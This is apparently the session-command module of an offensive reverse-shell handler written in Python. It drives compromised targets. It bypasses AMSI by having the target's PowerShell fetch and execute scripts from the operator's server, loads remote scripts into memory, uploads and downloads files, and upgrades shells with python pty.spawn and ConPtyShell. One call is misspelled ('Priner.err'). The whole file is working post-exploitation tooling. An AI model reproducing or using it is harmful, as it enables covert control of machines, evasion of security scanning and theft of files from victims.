import os
import re
import subprocess
from commands.abstract_command import AbstractCommand
from shell_utils.shell_factory import ShellTypes
from utils.print_utils import Printer
from utils.pwsh_utils import ObfUtil
from utils.term_manager import Term
from config.config import AppConfig
from prompt_toolkit.shortcuts import CompleteStyle
from prompt_toolkit.completion import NestedCompleter, PathCompleter, WordCompleter
from prompt_toolkit import PromptSession
from commands.toolbar import MinishToolbar

class SessionCommand(AbstractCommand):
    """
    Class handling the command available for a session
    """

    COMMANDS = {
        "amsi_bypass" : {"shell": [ShellTypes.Powershell], "help": "Bypass amsi"},
        "binaries"    : {"shell": ShellTypes, "help": "Display binaries available on the target"},
        "close"       : {"shell": ShellTypes, "help": "Close the connection"},
        "download"    : {"shell": ShellTypes, "help": "Download a file",
                                                "usage": "download <[bold blue]file_path[/bold blue]>"},
        "exit"        : {"shell": ShellTypes, "help": "Return to the menu"},
        "help"        : {"shell": ShellTypes, "help": "Show this help, or help about a current command",
                                                "usage": "help ?<[bold yellow]command[/bold yellow]>"},
        "info"        : {"shell": ShellTypes, "help": "Show info about the current session"},
        "load"        : {"shell": [ShellTypes.Powershell], "help": "Load a shell script in memory"},
        "reset"       : {"shell": [ShellTypes.Pty], "help": "Reset the terminal to [bold yellow]cooked[/bold yellow] mode"},
        "setraw"      : {"shell": [ShellTypes.Basic, ShellTypes.Powershell, ShellTypes.Windows], "help": "Equivalent to [bold]stty raw -echo[/bold]"},
        "scripts"     : {"shell": ShellTypes, "help": "Display available scripts in dedicated folder"},
        "shell"       : {"shell": ShellTypes, "help": "Interact with the underlying connection"},
        "upload"      : {"shell": ShellTypes, "help": "Upload a file in a writable directory",
                                                "usage": "upload <[bold blue]file_path[/bold blue]> <[bold blue]full_path_destination[/bold blue]>"},
        "upgrade"     : {"shell": [ShellTypes.Basic, ShellTypes.Powershell], "help": "Upgrade your session to a [bold]pty[/bold] (if possible)"},
        }

    def __init__(self, session_in_use):
        self.session_in_use = session_in_use
        self.full_cli = None
        self.init_session()

    def init_session(self):
        """Init the prompt session with  the needed completer"""
        dictionary_target = {}
        for k, _ in SessionCommand.COMMANDS.items():
            if(k == "upload" or (k == "load" and self.shell_type in SessionCommand.COMMANDS[k]["shell"])):
                dictionary_target[k] = PathCompleter(get_paths=lambda: [AppConfig.get("directory", "Script")])

            elif k == "help":
                dictionary_target[k] = WordCompleter(list(SessionCommand.COMMANDS.keys()))

            elif self.shell_type in SessionCommand.COMMANDS[k]["shell"]:
                dictionary_target[k] = None

        completer = NestedCompleter.from_nested_dict(dictionary_target)
        self.session = PromptSession(completer=completer, 
                                     complete_style=CompleteStyle.MULTI_COLUMN, 
                                     bottom_toolbar=MinishToolbar.get_toolbar, 
                                     refresh_interval=MinishToolbar.refresh_interval)

    @property
    def command_executor(self):
        """
        Wrapper for the attribute command_executor that can execute code
        """
        return self.session_in_use.command_executor

    @property
    def shell_type(self):
        """
        Wrapper for the attribute shell_type that give the current type of shell
        """
        return self.session_in_use.connection.shell_type

    def __create_dir_if_not_exists(self, path):
        if not(os.path.exists(path)):
            os.makedirs(path)

    def __create_route(self):
        """Return the name for a route generated randomly"""
        return ObfUtil.get_random_string(21, ext=".log")

    def __can_run(self, cmd):
        """Check if a command can be run in this shelltype"""
        info = self.COMMANDS.get(cmd)
        if(info is not None):
            return self.shell_type in info["shell"]
        return False

    def __get_file(self, filename):
        """Used when uploading a file, get it from current path or from the APP Script path"""
        script_path = AppConfig.get("directory", "Script")
        if os.path.isfile(filename):
            return filename

        script_filename = script_path + "/" + filename
        if os.path.isfile(script_filename):
            return script_filename

        Printer.err(f"File not found [blue]{filename}[/blue]")
        return None
    
    def handle_input(self, cmd):
        if(self.is_shell_command(cmd)):
            subprocess.run(cmd[1:], shell = True)

        else:
            method, args = self.parse_command(cmd)

            if(self.__can_run(method) and method is not None):
                self.call(method, *args)

            else:
                self.err(method)

    def print_help_header(self):
        Printer.print("========== [blue]Session [bold]Commands[/blue][/bold] ==========")

    def execute_load(self, *args):
        """Load a script in memory, only available in powershell mode"""
        if len(args) == 0:
            Printer.err("Load requires an argument")
        else:
            script = self.__get_file(args[0])
            if script is not None:
                route = self.__create_route()
                try:
                    self.session_in_use.download_server.notify_download(route, script)
                    Printer.log(f"Creating route {route} --> {script}")
                    self.command_executor.exec(
                        self.session_in_use.download_server.download_link_powershell(route),
                        timeout=2.5,
                        get_all=False,
                        shell_type=self.shell_type
                        )

                except Exception:
                    Printer.exception()

                finally:
                    self.session_in_use.download_server.end_download(route)

    def execute_help(self, *args):
        self.print_help_header()
        if(len(args) >= 1):
            usage = SessionCommand._get_help_for_command(args[0])
            if(usage is not None):
                Printer.print(usage)
            else:
                Printer.err("No such function")

        else:
            for cmd, info in SessionCommand.COMMANDS.items():
                if(self.shell_type in info["shell"]):
                    Printer.print(f" - [dodger_blue1]{cmd:<12}[/dodger_blue1]\t" + info['help'])
        print()

    def execute_amsi_bypass(self, *args):
        payload = []
        payload.append(self.session_in_use.download_server.download_link_powershell(AppConfig.get("amsi_route1", "Routes")))
        payload.append(self.session_in_use.download_server.download_link_powershell(AppConfig.get("amsi_route2", "Routes")))
        # payload.append(self.session_in_use.download_server.download_link_powershell(AppConfig.get("etw_route", "Routes"))) # Route to enable in order to disable etw
        self.command_executor.exec_all_no_result(payload, shell_type=ShellTypes.Powershell)
        Printer.log("Run: [i]AmsiUtils[/i] and expect a powershell error")

    def execute_info(self, *args):
        self.session_in_use.show_session_info()

    def execute_binaries(self, *args):
        Printer.log("[bold]Binaries[/bold] availables:")
        for b in self.session_in_use.session_assets.binaries:
            Printer.pad().log(b)

    def execute_close(self, *args):
        self.session_in_use.notify_close()

    def execute_shell(self, *args):
        Printer.log("Starting interactive shell with connection")
        self.session_in_use.connection.run()

    def execute_scripts(self, *args):
        script_dir = AppConfig.get("directory", "Script")
        if(os.path.isdir(script_dir)):
            Printer.log("Available [bold]scripts[/bold]:")
            for file in sorted(os.listdir(script_dir)):
                Printer.pad().log(file)
        else:
            Printer.err(f"Directory [red]{script_dir}[/red] is missing")

    def execute_download(self, *args):
        if len(args) == 0:
            Priner.err("Missing argument filepath")
        else:
            file = args[0]
            Printer.log(f"Downloading [dodger_blue1]{file}[/dodger_blue1]")
            download_directory = AppConfig.get("directory", "Download")
            self.__create_dir_if_not_exists(download_directory)
            self.command_executor.download(file, download_directory, self.shell_type, self.session_in_use.session_assets.binaries)

    def execute_upgrade(self, *args):
        cmdline = PtyUpgrade.get_tty_cmd(self.session_in_use.session_assets.binaries)
        if cmdline is not None:
            if self.shell_type is ShellTypes.Basic:
                self.command_executor.exec_no_result(cmdline)
                tty = self.command_executor.exec("tty", timeout=1.0, get_all=True)
                if not(re.match(r".*/dev/.*", tty)):
                    Printer.err("Could not upgrade terminal to [red]tty...[/red]")
                else:
                    Printer.msg("Shell succesfully upgraded to [bold yellow]tty[/bold yellow]")
                    self.session_in_use.connection.change_shell(ShellTypes.Pty)
                    self.init_session()

        elif self.shell_type is ShellTypes.Powershell:
            self.execute_load("Invoke-ConPtyShell.ps1")
            lines, columns = Term.get_size()
            self.command_executor.exec_no_result(f"Invoke-Test -Rows {lines} -Cols {columns}")
        else:
            Printer.err("Cannot upgrade shell to [red]tty...[/red]")

    def execute_upload(self, *args):
        if len(args) != 2:
            Printer.err("Missing argument to the [yellow]upload[/yellow] function")
        else:
            filename = self.__get_file(args[0])
            if filename is not None:
                where = args[1]
                route = self.__create_route()
                try:
                    self.session_in_use.download_server.notify_download(route, filename)
                    Printer.log(f"Creating route {route} --> {filename}")
                    self.command_executor.upload_http(
                            self.session_in_use.download_server.create_download_link(route),
                            where,
                            self.shell_type,
                            self.session_in_use.session_assets.binaries
                            )

                except Exception as e:
                    Printer.err(e)

                finally:
                    self.session_in_use.download_server.end_download(route)

    def execute_setraw(self, *args):
        self.session_in_use.connection.change_shell(ShellTypes.Pty)
        Printer.log("Terminal set to [yellow]raw[/yellow] mode")
        self.init_session()

    def execute_reset(self, *args):
        self.session_in_use.connection.change_shell(ShellTypes.Basic)
        Printer.log("Terminal set to [yellow]cooked[/yellow] mode")
        self.init_session()

class PtyUpgrade:
    
    COMMANDS = {
        "python3" : "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "python"  : "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "script"  : "script /dev/null -qc /bin/bash"
        }

    @staticmethod
    def get_tty_cmd(binaries):
        for b in binaries:
            cmd = PtyUpgrade.COMMANDS.get(b)
            if(cmd is not None):
                return cmd
        return None
